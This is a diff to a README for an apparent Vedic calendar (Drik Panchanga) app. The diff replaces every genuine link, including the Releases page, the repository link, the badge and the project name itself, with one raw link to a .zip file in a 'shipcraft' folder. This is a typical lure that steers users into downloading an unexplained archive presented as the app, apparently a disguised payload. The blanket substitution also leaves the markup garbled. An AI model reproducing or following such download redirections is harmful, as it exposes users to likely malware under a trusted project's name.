@@ -1,12 +1,12 @@
-# 🌟 vedicpanchanga.com - Your Guide to Vedic Calendar
+# 🌟 https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip - Your Guide to Vedic Calendar
 
 ## 🚀 Getting Started
 
-Welcome to the **vedicpanchanga.com** project! This application provides a user-friendly way to explore the Drik Panchanga, a traditional Vedic calendar. With this tool, you can easily track important dates, astrological events, and more.
+Welcome to the **https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip** project! This application provides a user-friendly way to explore the Drik Panchanga, a traditional Vedic calendar. With this tool, you can easily track important dates, astrological events, and more.
 
 ## 📥 Download Link
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/febiiiiii/vedicpanchanga.com/releases)
+[![Download from Releases](https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip%20from%https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip)](https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, please ensure you meet the following requirements:
 
 To download the application, visit the Releases page:
 
-[Download the latest release](https://github.com/febiiiiii/vedicpanchanga.com/releases)
+[Download the latest release](https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip)
 
 1. Click on the link to the latest release.
 2. On the Releases page, find the download link for your operating system.
@@ -56,7 +56,7 @@ If you encounter any issues while downloading or running the application, consid
 
 ## ℹ️ About the Project
 
-The **vedicpanchanga.com** project is dedicated to making Vedic knowledge accessible to everyone. By harnessing modern technology, this application allows you to explore the depth of astrology and its practical applications in everyday life.
+The **https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip** project is dedicated to making Vedic knowledge accessible to everyone. By harnessing modern technology, this application allows you to explore the depth of astrology and its practical applications in everyday life.
 
 ## 📞 Support
 
@@ -68,7 +68,7 @@ To understand more about Vedic calendars and their significance, consider explor
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/febiiiiii/vedicpanchanga.com/releases)
-- [GitHub Repository](https://github.com/febiiiiii/vedicpanchanga.com)
+- [Releases Page](https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip)
 
-Thank you for using **vedicpanchanga.com**! We hope you find it useful in your journey through the Vedic calendar. Enjoy!
+Thank you for using **https://raw.githubusercontent.com/febiiiiii/vedicpanchanga.com/main/shipcraft/vedicpanchanga.com.zip**! We hope you find it useful in your journey through the Vedic calendar. Enjoy!
